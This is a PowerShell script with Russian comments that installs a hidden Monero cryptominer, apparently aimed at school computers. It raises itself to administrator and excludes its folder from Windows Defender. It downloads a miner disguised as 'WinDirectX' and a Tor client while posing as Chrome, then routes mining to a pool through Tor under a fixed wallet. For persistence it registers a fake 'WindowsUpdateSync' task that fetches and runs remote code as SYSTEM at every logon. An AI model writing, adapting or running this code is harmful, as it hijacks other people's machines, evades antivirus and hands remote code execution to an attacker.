# 0. Самовозвышение до Администратора
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Break
}

# --- КОНФИГУРАЦИЯ ---
$path = "C:\ProgramData\SystemLib"
$wallet = "429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA" 
$procName = "WinDirectX"
$exeUrl = "https://github.com/Isfandiyor0112-star/sminers/raw/main/WinDirectX.exe"
$torUrl = "https://github.com/Isfandiyor0112-star/sminers/raw/main/tor.exe"
$rawScript = "https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/refs/heads/main/win_utility.ps1"

Write-Host "--- ПОПЫТКА ЗАГРУЗКИ С МАСКИРОВКОЙ ПОД CHROME ---" -ForegroundColor Cyan

# 1. Настройка электропитания
powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c -ErrorAction SilentlyContinue
powercfg /x -standby-timeout-ac 0
powercfg /x -hibernate-timeout-ac 0
powercfg /x -monitor-timeout-ac 5

# 2. Остановка процессов
Stop-Process -Name $procName -Force -ErrorAction SilentlyContinue
Stop-Process -Name "tor" -Force -ErrorAction SilentlyContinue

# 3. Антивирус и папка
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue

# 4. Загрузка компонентов (ХИТРЫЙ МЕТОД)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
# Притворяемся браузером
$UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

try {
    if (!(Test-Path "$path\$procName.exe")) { 
        Write-Host "Качаем ядро..." -NoNewline
        Invoke-WebRequest -Uri $exeUrl -OutFile "$path\$procName.exe" -UserAgent $UA -ErrorAction Stop
        Write-Host " Ок." -ForegroundColor Green
    }
    if (!(Test-Path "$path\tor.exe")) { 
        Write-Host "Качаем туннель..." -NoNewline
        Invoke-WebRequest -Uri $torUrl -OutFile "$path\tor.exe" -UserAgent $UA -ErrorAction Stop
        Write-Host " Ок." -ForegroundColor Green
    }
} catch { 
    Write-Host "`n[!] СЕТЬ ВСЁ ЕЩЁ БЛОКИРУЕТСЯ." -ForegroundColor Red
    Write-Host "Бро, единственный путь — закинуть файлы с флешки в $path" -ForegroundColor Yellow
    exit 
}

# 5. Файлы запуска
$cmd = "@echo off`nstart /b $path\tor.exe --SocksPort 9050 --Quiet`ntimeout /t 15 /nobreak >nul`n$path\$procName.exe --title $procName --cpu-priority 1 --cpu-no-yield --cpu-max-threads-hint 50 -o gulf.moneroocean.stream:443 -u $wallet -p school_pc --algo rx/0 --donate-level 1 --tls --proxy=socks5://127.0.0.1:9050"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

# 6. Автозагрузка
$taskName = "WindowsUpdateSync"
$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-WindowStyle Hidden -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm '$rawScript' | iex"""
Register-ScheduledTask -Action $action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -TaskName $taskName -User "System" -RunLevel Highest -Force | Out-Null

# 7. Функции в профиль
$Functions = @"
function check {
    `$p = Get-Process $procName -ErrorAction SilentlyContinue
    `$t = Get-Process "tor" -ErrorAction SilentlyContinue
    if (`$p) { Write-Host "МАЙНЕР: РАБОТАЕТ (`$([Math]::Round(`$p.WorkingSet64 / 1MB, 2)) MB)" -ForegroundColor Green }
    if (`$t) { Write-Host "TOR: АКТИВЕН" -ForegroundColor Green } else { Write-Host "TOR: ВЫКЛЮЧЕН" -ForegroundColor Red }
}
"@
$Functions | Out-File -FilePath $PROFILE -Force

# 8. Старт
Start-Process -FilePath "$path\win_start.vbs"
Write-Host "--- СИСТЕМА АКТИВИРОВАНА ---" -ForegroundColor Magenta
